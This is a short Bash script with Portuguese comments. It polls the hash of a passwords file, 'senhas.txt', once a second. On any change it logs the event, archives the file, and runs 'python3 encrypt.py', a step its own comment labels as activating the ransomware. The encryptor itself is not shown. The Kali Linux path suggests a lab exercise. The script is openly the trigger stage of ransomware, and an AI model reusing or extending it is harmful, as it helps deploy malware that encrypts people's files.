#!/bin/bash

clear

#VARIÁVEIS
N1="0"
N2="1"
AM="senhas.txt"
LOG="LOGS.log"

#LOOP
while [ $N1 != $N2 ];
do

        #HASH1
        P1=`sha512sum $AM | awk -F " " '{ print $1 }'`

        #TEMPORIZADOR
        sleep 1

        #HASH2
        P2=`sha512sum $AM | awk -F " " '{ print $1 }'`

        #VERIFICAÇÃO
        if [ $P1 != $P2 ];
        then

                #PONTUANDO NO ARQUIVO DE LOG
                echo "$AM --> " `date` >> $LOG

                #FAZENDO BACKUP DAS ALTERAÇÕES
                tar -cvzf /home/kali/Verificador/alteracoes/day_`date +%d`_time_`date +%T`.tar.gz $AM       

                #ADICIONANDO 1 NO VALOR DO BACKUP
                let "V++"

                #ATIVANDO O RANSOMWARE
                python3 encrypt.py
                N2="0"
        fi
done